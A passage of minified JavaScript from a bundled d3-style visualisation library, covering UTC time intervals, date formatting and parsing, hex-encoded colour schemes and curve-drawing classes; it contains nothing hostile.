jo=Oo(0),zo=Oo(1),Po=Oo(2),Io=Oo(3),Ro=Oo(4),Fo=Oo(5),qo=Oo(6),Bo=(jo.range,zo.range,Po.range,Io.range,Ro.range,Fo.range,qo.range,uo((function(t){t.setUTCDate(1),t.setUTCHours(0,0,0,0)}),(function(t,e){t.setUTCMonth(t.getUTCMonth()+e)}),(function(t,e){return e.getUTCMonth()-t.getUTCMonth()+12*(e.getUTCFullYear()-t.getUTCFullYear())}),(function(t){return t.getUTCMonth()})));Bo.range;var Yo=uo((function(t){t.setUTCMonth(0,1),t.setUTCHours(0,0,0,0)}),(function(t,e){t.setUTCFullYear(t.getUTCFullYear()+e)}),(function(t,e){return e.getUTCFullYear()-t.getUTCFullYear()}),(function(t){return t.getUTCFullYear()}));Yo.every=function(t){return isFinite(t=Math.floor(t))&&t>0?uo((function(e){e.setUTCFullYear(Math.floor(e.getUTCFullYear()/t)*t),e.setUTCMonth(0,1),e.setUTCHours(0,0,0,0)}),(function(e,n){e.setUTCFullYear(e.getUTCFullYear()+n*t)})):null};const Wo=Yo;function Ko(t){if(0<=t.y&&t.y<100){var e=new Date(-1,t.m,t.d,t.H,t.M,t.S,t.L);return e.setFullYear(t.y),e}return new Date(t.y,t.m,t.d,t.H,t.M,t.S,t.L)}function Ho(t){if(0<=t.y&&t.y<100){var e=new Date(Date.UTC(-1,t.m,t.d,t.H,t.M,t.S,t.L));return e.setUTCFullYear(t.y),e}return new Date(Date.UTC(t.y,t.m,t.d,t.H,t.M,t.S,t.L))}function Xo(t){return{y:t,m:0,d:1,H:0,M:0,S:0,L:0}}Yo.range;var $o,Vo,Zo,Jo={"-":"",_:" ",0:"0"},Qo=/^\s*\d+/,ta=/^%/,ea=/[\\^$*+?|[\]().{}]/g;function na(t,e,n){var r=t<0?"-":"",i=(r?-t:t)+"",o=i.length;return r+(o<n?new Array(n-o+1).join(e)+i:i)}function ra(t){return t.replace(ea,"\\$&")}function ia(t){return new RegExp("^(?:"+t.map(ra).join("|")+")","i")}function oa(t){for(var e={},n=-1,r=t.length;++n<r;)e[t[n].toLowerCase()]=n;return e}function aa(t,e,n){var r=Qo.exec(e.slice(n,n+1));return r?(t.w=+r[0],n+r[0].length):-1}function ua(t,e,n){var r=Qo.exec(e.slice(n,n+1));return r?(t.u=+r[0],n+r[0].length):-1}function ca(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.U=+r[0],n+r[0].length):-1}function sa(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.V=+r[0],n+r[0].length):-1}function ha(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.W=+r[0],n+r[0].length):-1}function fa(t,e,n){var r=Qo.exec(e.slice(n,n+4));return r?(t.y=+r[0],n+r[0].length):-1}function la(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.y=+r[0]+(+r[0]>68?1900:2e3),n+r[0].length):-1}function da(t,e,n){var r=/^(Z)|([+-]\d\d)(?::?(\d\d))?/.exec(e.slice(n,n+6));return r?(t.Z=r[1]?0:-(r[2]+(r[3]||"00")),n+r[0].length):-1}function pa(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.m=r[0]-1,n+r[0].length):-1}function ya(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.d=+r[0],n+r[0].length):-1}function ga(t,e,n){var r=Qo.exec(e.slice(n,n+3));return r?(t.m=0,t.d=+r[0],n+r[0].length):-1}function va(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.H=+r[0],n+r[0].length):-1}function ma(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.M=+r[0],n+r[0].length):-1}function _a(t,e,n){var r=Qo.exec(e.slice(n,n+2));return r?(t.S=+r[0],n+r[0].length):-1}function ba(t,e,n){var r=Qo.exec(e.slice(n,n+3));return r?(t.L=+r[0],n+r[0].length):-1}function wa(t,e,n){var r=Qo.exec(e.slice(n,n+6));return r?(t.L=Math.floor(r[0]/1e3),n+r[0].length):-1}function xa(t,e,n){var r=ta.exec(e.slice(n,n+1));return r?n+r[0].length:-1}function ka(t,e,n){var r=Qo.exec(e.slice(n));return r?(t.Q=+r[0],n+r[0].length):-1}function Ma(t,e,n){var r=Qo.exec(e.slice(n));return r?(t.Q=1e3*+r[0],n+r[0].length):-1}function Ea(t,e){return na(t.getDate(),e,2)}function Aa(t,e){return na(t.getHours(),e,2)}function Sa(t,e){return na(t.getHours()%12||12,e,2)}function La(t,e){return na(1+_o.count(Co(t),t),e,3)}function Na(t,e){return na(t.getMilliseconds(),e,3)}function Ca(t,e){return Na(t,e)+"000"}function Ta(t,e){return na(t.getMonth()+1,e,2)}function Ga(t,e){return na(t.getMinutes(),e,2)}function Ua(t,e){return na(t.getSeconds(),e,2)}function Da(t){var e=t.getDay();return 0===e?7:e}function Oa(t,e){return na(wo.count(Co(t),t),e,2)}function ja(t,e){var n=t.getDay();return t=n>=4||0===n?Eo(t):Eo.ceil(t),na(Eo.count(Co(t),t)+(4===Co(t).getDay()),e,2)}function za(t){return t.getDay()}function Pa(t,e){return na(xo.count(Co(t),t),e,2)}function Ia(t,e){return na(t.getFullYear()%100,e,2)}function Ra(t,e){return na(t.getFullYear()%1e4,e,4)}function Fa(t){var e=t.getTimezoneOffset();return(e>0?"-":(e*=-1,"+"))+na(e/60|0,"0",2)+na(e%60,"0",2)}function qa(t,e){return na(t.getUTCDate(),e,2)}function Ba(t,e){return na(t.getUTCHours(),e,2)}function Ya(t,e){return na(t.getUTCHours()%12||12,e,2)}function Wa(t,e){return na(1+Do.count(Wo(t),t),e,3)}function Ka(t,e){return na(t.getUTCMilliseconds(),e,3)}function Ha(t,e){return Ka(t,e)+"000"}function Xa(t,e){return na(t.getUTCMonth()+1,e,2)}function $a(t,e){return na(t.getUTCMinutes(),e,2)}function Va(t,e){return na(t.getUTCSeconds(),e,2)}function Za(t){var e=t.getUTCDay();return 0===e?7:e}function Ja(t,e){return na(jo.count(Wo(t),t),e,2)}function Qa(t,e){var n=t.getUTCDay();return t=n>=4||0===n?Ro(t):Ro.ceil(t),na(Ro.count(Wo(t),t)+(4===Wo(t).getUTCDay()),e,2)}function tu(t){return t.getUTCDay()}function eu(t,e){return na(zo.count(Wo(t),t),e,2)}function nu(t,e){return na(t.getUTCFullYear()%100,e,2)}function ru(t,e){return na(t.getUTCFullYear()%1e4,e,4)}function iu(){return"+0000"}function ou(){return"%"}function au(t){return+t}function uu(t){return Math.floor(+t/1e3)}$o=function(t){var e=t.dateTime,n=t.date,r=t.time,i=t.periods,o=t.days,a=t.shortDays,u=t.months,c=t.shortMonths,s=ia(i),h=oa(i),f=ia(o),l=oa(o),d=ia(a),p=oa(a),y=ia(u),g=oa(u),v=ia(c),m=oa(c),_={a:function(t){return a[t.getDay()]},A:function(t){return o[t.getDay()]},b:function(t){return c[t.getMonth()]},B:function(t){return u[t.getMonth()]},c:null,d:Ea,e:Ea,f:Ca,H:Aa,I:Sa,j:La,L:Na,m:Ta,M:Ga,p:function(t){return i[+(t.getHours()>=12)]},Q:au,s:uu,S:Ua,u:Da,U:Oa,V:ja,w:za,W:Pa,x:null,X:null,y:Ia,Y:Ra,Z:Fa,"%":ou},b={a:function(t){return a[t.getUTCDay()]},A:function(t){return o[t.getUTCDay()]},b:function(t){return c[t.getUTCMonth()]},B:function(t){return u[t.getUTCMonth()]},c:null,d:qa,e:qa,f:Ha,H:Ba,I:Ya,j:Wa,L:Ka,m:Xa,M:$a,p:function(t){return i[+(t.getUTCHours()>=12)]},Q:au,s:uu,S:Va,u:Za,U:Ja,V:Qa,w:tu,W:eu,x:null,X:null,y:nu,Y:ru,Z:iu,"%":ou},w={a:function(t,e,n){var r=d.exec(e.slice(n));return r?(t.w=p[r[0].toLowerCase()],n+r[0].length):-1},A:function(t,e,n){var r=f.exec(e.slice(n));return r?(t.w=l[r[0].toLowerCase()],n+r[0].length):-1},b:function(t,e,n){var r=v.exec(e.slice(n));return r?(t.m=m[r[0].toLowerCase()],n+r[0].length):-1},B:function(t,e,n){var r=y.exec(e.slice(n));return r?(t.m=g[r[0].toLowerCase()],n+r[0].length):-1},c:function(t,n,r){return M(t,e,n,r)},d:ya,e:ya,f:wa,H:va,I:va,j:ga,L:ba,m:pa,M:ma,p:function(t,e,n){var r=s.exec(e.slice(n));return r?(t.p=h[r[0].toLowerCase()],n+r[0].length):-1},Q:ka,s:Ma,S:_a,u:ua,U:ca,V:sa,w:aa,W:ha,x:function(t,e,r){return M(t,n,e,r)},X:function(t,e,n){return M(t,r,e,n)},y:la,Y:fa,Z:da,"%":xa};function x(t,e){return function(n){var r,i,o,a=[],u=-1,c=0,s=t.length;for(n instanceof Date||(n=new Date(+n));++u<s;)37===t.charCodeAt(u)&&(a.push(t.slice(c,u)),null!=(i=Jo[r=t.charAt(++u)])?r=t.charAt(++u):i="e"===r?" ":"0",(o=e[r])&&(r=o(n,i)),a.push(r),c=u+1);return a.push(t.slice(c,u)),a.join("")}}function k(t,e){return function(n){var r,i,o=Xo(1900);if(M(o,t,n+="",0)!=n.length)return null;if("Q"in o)return new Date(o.Q);if("p"in o&&(o.H=o.H%12+12*o.p),"V"in o){if(o.V<1||o.V>53)return null;"w"in o||(o.w=1),"Z"in o?(i=(r=Ho(Xo(o.y))).getUTCDay(),r=i>4||0===i?zo.ceil(r):zo(r),r=Do.offset(r,7*(o.V-1)),o.y=r.getUTCFullYear(),o.m=r.getUTCMonth(),o.d=r.getUTCDate()+(o.w+6)%7):(i=(r=e(Xo(o.y))).getDay(),r=i>4||0===i?xo.ceil(r):xo(r),r=_o.offset(r,7*(o.V-1)),o.y=r.getFullYear(),o.m=r.getMonth(),o.d=r.getDate()+(o.w+6)%7)}else("W"in o||"U"in o)&&("w"in o||(o.w="u"in o?o.u%7:"W"in o?1:0),i="Z"in o?Ho(Xo(o.y)).getUTCDay():e(Xo(o.y)).getDay(),o.m=0,o.d="W"in o?(o.w+6)%7+7*o.W-(i+5)%7:o.w+7*o.U-(i+6)%7);return"Z"in o?(o.H+=o.Z/100|0,o.M+=o.Z%100,Ho(o)):e(o)}}function M(t,e,n,r){for(var i,o,a=0,u=e.length,c=n.length;a<u;){if(r>=c)return-1;if(37===(i=e.charCodeAt(a++))){if(i=e.charAt(a++),!(o=w[i in Jo?e.charAt(a++):i])||(r=o(t,n,r))<0)return-1}else if(i!=n.charCodeAt(r++))return-1}return r}return _.x=x(n,_),_.X=x(r,_),_.c=x(e,_),b.x=x(n,b),b.X=x(r,b),b.c=x(e,b),{format:function(t){var e=x(t+="",_);return e.toString=function(){return t},e},parse:function(t){var e=k(t+="",Ko);return e.toString=function(){return t},e},utcFormat:function(t){var e=x(t+="",b);return e.toString=function(){return t},e},utcParse:function(t){var e=k(t,Ho);return e.toString=function(){return t},e}}}({dateTime:"%x, %X",date:"%-m/%-d/%Y",time:"%-I:%M:%S %p",periods:["AM","PM"],days:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],shortDays:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],months:["January","February","March","April","May","June","July","August","September","October","November","December"],shortMonths:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"]}),$o.format,$o.parse,Vo=$o.utcFormat,Zo=$o.utcParse;var cu="%Y-%m-%dT%H:%M:%S.%LZ";function su(t){return t.match(/.{6}/g).map((function(t){return"#"+t}))}function hu(t){var e=t.length;return function(n){return t[Math.max(0,Math.min(e-1,Math.floor(n*e)))]}}Date.prototype.toISOString||Vo(cu),+new Date("2000-01-01T00:00:00.000Z")||Zo(cu),su("1f77b4ff7f0e2ca02cd627289467bd8c564be377c27f7f7fbcbd2217becf"),su("393b795254a36b6ecf9c9ede6379398ca252b5cf6bcedb9c8c6d31bd9e39e7ba52e7cb94843c39ad494ad6616be7969c7b4173a55194ce6dbdde9ed6"),su("3182bd6baed69ecae1c6dbefe6550dfd8d3cfdae6bfdd0a231a35474c476a1d99bc7e9c0756bb19e9ac8bcbddcdadaeb636363969696bdbdbdd9d9d9"),su("1f77b4aec7e8ff7f0effbb782ca02c98df8ad62728ff98969467bdc5b0d58c564bc49c94e377c2f7b6d27f7f7fc7c7c7bcbd22dbdb8d17becf9edae5"),wn(Be(300,.5,0),Be(-240,.5,1)),wn(Be(-100,.75,.35),Be(80,1.5,.8)),wn(Be(260,.75,.35),Be(80,1.5,.8)),Be(),hu(su("44015444025645045745055946075a46085c460a5d460b5e470d60470e6147106347116447136548146748166848176948186a481a6c481b6d481c6e481d6f481f70482071482173482374482475482576482677482878482979472a7a472c7a472d7b472e7c472f7d46307e46327e46337f463480453581453781453882443983443a83443b84433d84433e85423f854240864241864142874144874045884046883f47883f48893e49893e4a893e4c8a3d4d8a3d4e8a3c4f8a3c508b3b518b3b528b3a538b3a548c39558c39568c38588c38598c375a8c375b8d365c8d365d8d355e8d355f8d34608d34618d33628d33638d32648e32658e31668e31678e31688e30698e306a8e2f6b8e2f6c8e2e6d8e2e6e8e2e6f8e2d708e2d718e2c718e2c728e2c738e2b748e2b758e2a768e2a778e2a788e29798e297a8e297b8e287c8e287d8e277e8e277f8e27808e26818e26828e26828e25838e25848e25858e24868e24878e23888e23898e238a8d228b8d228c8d228d8d218e8d218f8d21908d21918c20928c20928c20938c1f948c1f958b1f968b1f978b1f988b1f998a1f9a8a1e9b8a1e9c891e9d891f9e891f9f881fa0881fa1881fa1871fa28720a38620a48621a58521a68522a78522a88423a98324aa8325ab8225ac8226ad8127ad8128ae8029af7f2ab07f2cb17e2db27d2eb37c2fb47c31b57b32b67a34b67935b77937b87838b9773aba763bbb753dbc743fbc7340bd7242be7144bf7046c06f48c16e4ac16d4cc26c4ec36b50c46a52c56954c56856c66758c7655ac8645cc8635ec96260ca6063cb5f65cb5e67cc5c69cd5b6ccd5a6ece5870cf5773d05675d05477d1537ad1517cd2507fd34e81d34d84d44b86d54989d5488bd6468ed64590d74393d74195d84098d83e9bd93c9dd93ba0da39a2da37a5db36a8db34aadc32addc30b0dd2fb2dd2db5de2bb8de29bade28bddf26c0df25c2df23c5e021c8e020cae11fcde11dd0e11cd2e21bd5e21ad8e219dae319dde318dfe318e2e418e5e419e7e419eae51aece51befe51cf1e51df4e61ef6e620f8e621fbe723fde725")),hu(su("00000401000501010601010802010902020b02020d03030f03031204041405041606051806051a07061c08071e0907200a08220b09240c09260d0a290e0b2b100b2d110c2f120d31130d34140e36150e38160f3b180f3d19103f1a10421c10441d11471e114920114b21114e22115024125325125527125829115a2a115c2c115f2d11612f116331116533106734106936106b38106c390f6e3b0f703d0f713f0f72400f74420f75440f764510774710784910784a10794c117a4e117b4f127b51127c52137c54137d56147d57157e59157e5a167e5c167f5d177f5f187f601880621980641a80651a80671b80681c816a1c816b1d816d1d816e1e81701f81721f817320817521817621817822817922827b23827c23827e24828025828125818326818426818627818827818928818b29818c29818e2a81902a81912b81932b80942c80962c80982d80992d809b2e7f9c2e7f9e2f7fa02f7fa1307ea3307ea5317ea6317da8327daa337dab337cad347cae347bb0357bb2357bb3367ab5367ab73779b83779ba3878bc3978bd3977bf3a77c03a76c23b75c43c75c53c74c73d73c83e73ca3e72cc3f71cd4071cf4070d0416fd2426fd3436ed5446dd6456cd8456cd9466bdb476adc4869de4968df4a68e04c67e24d66e34e65e44f64e55064e75263e85362e95462ea5661eb5760ec5860ed5a5fee5b5eef5d5ef05f5ef1605df2625df2645cf3655cf4675cf4695cf56b5cf66c5cf66e5cf7705cf7725cf8745cf8765cf9785df9795df97b5dfa7d5efa7f5efa815ffb835ffb8560fb8761fc8961fc8a62fc8c63fc8e64fc9065fd9266fd9467fd9668fd9869fd9a6afd9b6bfe9d6cfe9f6dfea16efea36ffea571fea772fea973feaa74feac76feae77feb078feb27afeb47bfeb67cfeb77efeb97ffebb81febd82febf84fec185fec287fec488fec68afec88cfeca8dfecc8ffecd90fecf92fed194fed395fed597fed799fed89afdda9cfddc9efddea0fde0a1fde2a3fde3a5fde5a7fde7a9fde9aafdebacfcecaefceeb0fcf0b2fcf2b4fcf4b6fcf6b8fcf7b9fcf9bbfcfbbdfcfdbf")),hu(su("00000401000501010601010802010a02020c02020e03021004031204031405041706041907051b08051d09061f0a07220b07240c08260d08290e092b10092d110a30120a32140b34150b37160b39180c3c190c3e1b0c411c0c431e0c451f0c48210c4a230c4c240c4f260c51280b53290b552b0b572d0b592f0a5b310a5c320a5e340a5f3609613809623909633b09643d09653e0966400a67420a68440a68450a69470b6a490b6a4a0c6b4c0c6b4d0d6c4f0d6c510e6c520e6d540f6d550f6d57106e59106e5a116e5c126e5d126e5f136e61136e62146e64156e65156e67166e69166e6a176e6c186e6d186e6f196e71196e721a6e741a6e751b6e771c6d781c6d7a1d6d7c1d6d7d1e6d7f1e6c801f6c82206c84206b85216b87216b88226a8a226a8c23698d23698f24699025689225689326679526679727669827669a28659b29649d29649f2a63a02a63a22b62a32c61a52c60a62d60a82e5fa92e5eab2f5ead305dae305cb0315bb1325ab3325ab43359b63458b73557b93556ba3655bc3754bd3853bf3952c03a51c13a50c33b4fc43c4ec63d4dc73e4cc83f4bca404acb4149cc4248ce4347cf4446d04545d24644d34743d44842d54a41d74b3fd84c3ed94d3dda4e3cdb503bdd513ade5238df5337e05536e15635e25734e35933e45a31e55c30e65d2fe75e2ee8602de9612bea632aeb6429eb6628ec6726ed6925ee6a24ef6c23ef6e21f06f20f1711ff1731df2741cf3761bf37819f47918f57b17f57d15f67e14f68013f78212f78410f8850ff8870ef8890cf98b0bf98c0af98e09fa9008fa9207fa9407fb9606fb9706fb9906fb9b06fb9d07fc9f07fca108fca309fca50afca60cfca80dfcaa0ffcac11fcae12fcb014fcb216fcb418fbb61afbb81dfbba1ffbbc21fbbe23fac026fac228fac42afac62df9c72ff9c932f9cb35f8cd37f8cf3af7d13df7d340f6d543f6d746f5d949f5db4cf4dd4ff4df53f4e156f3e35af3e55df2e661f2e865f2ea69f1ec6df1ed71f1ef75f1f179f2f27df2f482f3f586f3f68af4f88ef5f992f6fa96f8fb9af9fc9dfafda1fcffa4")),hu(su("0d088710078813078916078a19068c1b068d1d068e20068f2206902406912605912805922a05932c05942e05952f059631059733059735049837049938049a3a049a3c049b3e049c3f049c41049d43039e44039e46039f48039f4903a04b03a14c02a14e02a25002a25102a35302a35502a45601a45801a45901a55b01a55c01a65e01a66001a66100a76300a76400a76600a76700a86900a86a00a86c00a86e00a86f00a87100a87201a87401a87501a87701a87801a87a02a87b02a87d03a87e03a88004a88104a78305a78405a78606a68707a68808a68a09a58b0aa58d0ba58e0ca48f0da4910ea3920fa39410a29511a19613a19814a099159f9a169f9c179e9d189d9e199da01a9ca11b9ba21d9aa31e9aa51f99a62098a72197a82296aa2395ab2494ac2694ad2793ae2892b02991b12a90b22b8fb32c8eb42e8db52f8cb6308bb7318ab83289ba3388bb3488bc3587bd3786be3885bf3984c03a83c13b82c23c81c33d80c43e7fc5407ec6417dc7427cc8437bc9447aca457acb4679cc4778cc4977cd4a76ce4b75cf4c74d04d73d14e72d24f71d35171d45270d5536fd5546ed6556dd7566cd8576bd9586ada5a6ada5b69db5c68dc5d67dd5e66de5f65de6164df6263e06363e16462e26561e26660e3685fe4695ee56a5de56b5de66c5ce76e5be76f5ae87059e97158e97257ea7457eb7556eb7655ec7754ed7953ed7a52ee7b51ef7c51ef7e50f07f4ff0804ef1814df1834cf2844bf3854bf3874af48849f48948f58b47f58c46f68d45f68f44f79044f79143f79342f89441f89540f9973ff9983ef99a3efa9b3dfa9c3cfa9e3bfb9f3afba139fba238fca338fca537fca636fca835fca934fdab33fdac33fdae32fdaf31fdb130fdb22ffdb42ffdb52efeb72dfeb82cfeba2cfebb2bfebd2afebe2afec029fdc229fdc328fdc527fdc627fdc827fdca26fdcb26fccd25fcce25fcd025fcd225fbd324fbd524fbd724fad824fada24f9dc24f9dd25f8df25f8e125f7e225f7e425f6e626f6e826f5e926f5eb27f4ed27f3ee27f3f027f2f227f1f426f1f525f0f724f0f921")),Math.abs,Math.atan2,Math.cos,Math.max,Math.min,Math.sin,Math.sqrt;var fu=Math.PI,lu=2*fu;function du(t){this._context=t}function pu(t){this._curve=t}du.prototype={areaStart:function(){this._line=0},areaEnd:function(){this._line=NaN},lineStart:function(){this._point=0},lineEnd:function(){(this._line||0!==this._line&&1===this._point)&&this._context.closePath(),this._line=1-this._line},point:function(t,e){switch(t=+t,e=+e,this._point){case 0:this._point=1,this._line?this._context.lineTo(t,e):this._context.moveTo(t,e);break;case 1:this._point=2;default:this._context.lineTo(t,e)}}},pu.prototype={areaStart:function(){this._curve.areaStart()},areaEnd:function(){this._curve.areaEnd()},lineStart:function(){this._curve.lineStart()},lineEnd:function(){this._curve.lineEnd()},point:function(t,e){this._curve.point(e*Math.sin(t),e*-Math.cos(t))}},Array.prototype.slice,Math.sqrt(1/3);Math.sin(fu/10),Math.sin(7*fu/10);function yu(){}function gu(t,e,n){t._context.bezierCurveTo((2*t._x0+t._x1)/3,(2*t._y0+t._y1)/3,(t._x0+2*t._x1)/3,(t._y0+2*t._y1)/3,(t._x0+4*t._x1+e)/6,(t._y0+4*t._y1+n)/6)}function vu(t){this._context=t}function mu(t,e){this._basis=new vu(t),this._beta=e}function _u(t,e,n){t._context.bezierCurveTo(t._x1+t._k*(t._x2-t._x0),t._y1+t._k*(t._y2-t._y0),t._x2+t._k*(t._x1-e),t._y2+t._k*(t._y1-n),t._x2,t._y2)}function bu(t,e){this._context=t,this._k=(1-e)/6}function wu(t,e){this._context=t,this._k=(1-e)/6}function xu(t,e){this._context=t,this._k=(1-e)/6}function ku(t,e,n){var r=t._x1,i=t._y1,o=t._x2,a=t._y2;if(t._l01_a>1e-12){var u=2*t._l01_2a+3*t._l01_a*t._l12_a+t._l12_2a,c=3*t._l01_a*(t._l01_a+t._l12_a);r=(r*u-t._x0*t._l12_2a+t._x2*t._l01_2a)/c,i=(i*u-t._y0*t._l12_2a+t._y2*t._l01_2a)/c}if(t._l23_a>1e-12){var s=2*t._l23_2a+3*t._l23_a*t._l12_a+t._l12_2a,h=3*t._l23_a*(t._l23_a+t._l12_a);o=(o*s+t._x1*t._l23_2a-e*t._l12_2a)/h,a=(a*s+t._y1*t._l23_2a-n*t._l12_2a)/h}t._context.bezierCurveTo(r,i,o,a,t._x2,t._y2)}function Mu(t,e){this._context=t,this._alpha=e}function Eu(t,e){this._context=t,this._alpha=e}function Au(t,e){this._context=t,this._alpha=e}function Su(t){return t<0?-1:1}function Lu(t,e,n){var r=t._x1-t._x0,i=e-t._x1,o=(t._y1-t._y0)/(r||i<0&&-0),a=(n-t._y1)/(i||r<0&&-0),u=(o*i+a*r)/(r+i);return(Su(o)+Su(a))*Math.min(Math.abs(o),Math.abs(a),.5*Math.abs(u))||0}function Nu(t,e){var n=t._x1-t._x0;return n?(3*(t._y1-t._y0)/n-e)/2:e}function Cu(t,e,n){var r=t._x0,i=t._y0,o=t._x1,a=t._y1,u=(o-r)/3;t._context.bezierCurveTo(r+u,i+u*e,o-u,a-u*n,o,a)}function Tu(t){this._context=t}function Gu(t){this._context=t}function Uu(){this._=null}function Du(t){t.U=t.C=t.L=t.R=t.P=t.N=null}function Ou(t,e){var n=e,r=e.R,i=n.U;i?i.L===n?i.L=r:i.R=r:t._=r,r.U=i,n.U=r,n.R=r.L,n.R&&(n.R.U=n),r.L=n}function ju(t,e){var n=e,r=e.L,i=n.U;i?i.L===n?i.L=r:i.R=r:t._=r,r.U=i,n.U=r,n.L=r.R,n.L&&(n.L.U=n),r.R=n}function zu(t){for(;t.L;)t=t.L;return t}Math.sin(lu/10),Math.cos(lu/10),Math.sqrt(3),Math.sqrt(3),Math.sqrt(12),vu.prototype={areaStart:function(){this._line=0},areaEnd:function(){this._line=NaN},lineStart:function(){this._x0=this._x1=this._y0=this._y1=NaN,this._point=0},lineEnd:function(){switch(this._point){case 3:gu(this,this._x1,this._y1);case 2:this._context.lineTo(this._x1,this._y1)}(this._line||0!==this._line&&1===this._point)&&this._context.closePath(),this._line=1-this._line},point:function(t,e){switch(t=+t,e=+e,this._point){case 0:this._point=1,this._line?this._context.lineTo(t,e):this._context.moveTo(t,e);break;case 1:this._point=2;break;case 2:this._point=3,this._context.lineTo((5*this._x0+this._x1)/6,(5*this._y0+this._y1)/6);default:gu(this,t,e)}this._x0=this._x1,this._x1=t,this._y0=this._y1,this._y1=e}},mu.prototype={lineStart:function(){this._x=[],this._y=[],this._basis.lineStart()},lineEnd:function(){var t=this._x,e=this._y,n=t.length-1;if(n>0)for(var r,i=t[0],o=e[0],a=t[n]-i,u=e[n]-o,c=-1;++c<=n;)r=c/n,this._basis.point(this._beta*t[c]+(1-this._beta)*(i+r*a),this._beta*e[c]+(1-this._beta)*(o+r*u));this._x=this._y=null,this._basis.lineEnd()},point:function(t,e){this._x.push(+t),this._y.push(+e)}},function t(e){function n(t){return 1===e?new vu(t):new mu(t,e)}return n.beta=function(e){return t(+e)},n}(.85),bu.prototype={areaStart:function(){this._line=0},areaEnd:function(){this._line=NaN},lineStart:function(){this._x0=this._x1=this._x2=this._y0=this._y1=this._y2=NaN,this._point=0},lineEnd:function(){switch(this._point){case 2:this._context.lineTo(this._x2,this._y2);break;case 3:_u(this,this._x1,this._y1)}(this._line||0!==this._line&&1===this._point)&&this._context.closePath(),this._line=1-this._line},point:function(t,e){switch(t=+t,e=+e,this._point){case 0:this._point=1,this._line?this._context.lineTo(t,e):this._context.moveTo(t,e);break;case 1:this._point=2,this._x1=t,this._y1=e;break;case 2:this._point=3;default:_u(this,t,e)}this._x0=this._x1,this._x1=this._x2,this._x2=t,this._y0=this._y1,this._y1=this._y2,this._y2=e}},function t(e){function n(t){return new bu(t,e)}return n.tension=function(e){return t(+e)},n}(0),wu.prototype={areaStart:yu,areaEnd:yu,lineStart:function(){this._x0=this._x1=this._x2=this._x3=this._x4=this._x5=this._y0=this._y1=this._y2=this._y3=this._y4=this._y5=NaN,this._point=0},lineEnd:function(){switch(this._point){case 1:this._context.moveTo(this._x3,this._y3),this._context.closePath();break;case 2:this._context.lineTo(this._x3,this._y3),this._context.closePath();break;case 3:this.point(this._x3,this._y3),this.point(this._x4,this._y4),this.point(this._x5,this._y5)}},point:function(t,e){switch(t=+t,e=+e,this._point){case 0:this._point=1,this._x3=t,this._y3=e;break;case 1:this._point=2,this._context.moveTo(this._x4=t,this._y4=e);break;case 2:this._point=3,this._x5=t,this._y5=e;break;default:_u(this,t,e)}this._x0=this._x1,this._x1=this._x2,this._x2=t,this._y0=this._y1,this._y1=this._y2,this._y2=e}},function t(e){function n(t){return new wu(t,e)}return n.tension=function(e){return t(+e)},n}(0),xu.prototype={areaStart:function(){this._line=0},areaEnd:function(){this._line=NaN},lineStart:function(){this._x0=this._x1=this._x2=this._y0=this._y1=this._y2=NaN,this._point=0},lineEnd:function(){(this._line||0!==this._line&&3===this._point)&&this._context.closePath(),this._line=1-this._line},point:function(t,e){switch(t=+t,e=+e,this._point){case 0:this._point=1;break;case 1:this._point=2;break;case 2:this._point=3,this._line?this._context.lineTo(this._x2,this._y2):this._context.moveTo(this._x2,this._y2);break;case 3:this._point=4;default:_u(this,t,e)}this._x0=this._x1,this._x1=this._x2,this._x2=t,this._y0=this._y1,this._y1=this._y2,this._y2=e}},function t(e){function n(t){return new xu(t,e)}return n.tension=function(e){return t(+e)},n}(0),Mu.prototype={areaStart:function(){this._line=0},areaEnd:function(){this._line=NaN},lineStart:function(){this._x0=this._x1=this._x2=this._y0=this._y1=this._y2=NaN,this._l01_a=this._l12_a=this._l23_a=this._l01_2a=this._l12_2a=this._l23_2a=this._point=0},lineEnd:function(){switch(this._point){case 2:this._context.lineTo(this._x2,this._y2);break;case 3:this.point(this._x2,this._y2)}(this._line||0!==this._line&&1===this._point)&&this._context.closePath(),this._line=1-this._line},point:function(t,e){if(t=+t,e=+e,this._point){var n=this._x2-t,r=this._y2-e;this._l23_a=Math.sqrt(this._l23_2a=Math.pow(n*n+r*r,this._alpha))}switch(this._point){case 0:this._point=1,this._line?this._context.lineTo(t,e):this._context.moveTo(t,e);break;case 1:this._point=2;break;case 2:this._point=3;default:ku(this,t,e)}this._l01_a=this._l12_a,this._l12_a=this._l23_a,this._l01_2a=this._l12_2a,this._l12_2a=this._l23_2a,this._x0=this._x1,this._x1=this._x2,this._x2=t,this._y0=this._y1,this._y1=this._y2,this._y2=e}},function t(e){function n(t){return e?new Mu(t,e):new bu(t,0)}return n.alpha=function(e){return t(+e)},n}(.5),Eu.prototype={areaStart:yu,areaEnd:yu,lineStart:function(){this._x0=this._x1=this._x2=this._x3=this._x4=this._x5=this._y0=this._y1=this._y2=this._y3=this._y4=this._y5=NaN,this._l01_a=this._l12_a=this._l23_a=this._l01_2a=this._l12_2a=this._l23_2a=this._point=0},lineEnd:function(){switch(this._point){case 1:this._context.moveTo(this._x3,this._y3),this._context.closePath();break;case 2:this._context.lineTo(this._x3,this._y3),this._context.closePath();break;case 3:this.point(this._x3,this._y3),this.point(this._x4,this._y4),this.point(this._x5,this._y5)}},point:function(t,e){if(t=+t,e=+e,this._point){var n=this._x2-t,r=this._y2-e;this._l23_a=Math.sqrt(this._l23_2a=Math.pow(n*n+r*r,this._alpha))}switch(this._point){case 0:this._point=1,this._x3=t,this._y3=e;break;case 1:this._point=2,this._context.moveTo(this._x4=t,this._y4=e);break;case 2:this._point=3,this._x5=t,this._y5=e;break;default:ku(this,t,e)}this._l01_a=this._l12_a,this._l12_a=this._l23_a,this._l01_2a=this._l12_2a,this._l12_2a=this._l23_2a,this._x0=this._x1,this._x1=this._x2,this._x2=t,this._y0=this._y1,this._y1=this._y2,this._y2=e}},function t(e){function n(t){return e?new Eu(t,e):new wu(t,0)}return n.alpha=function(e){return 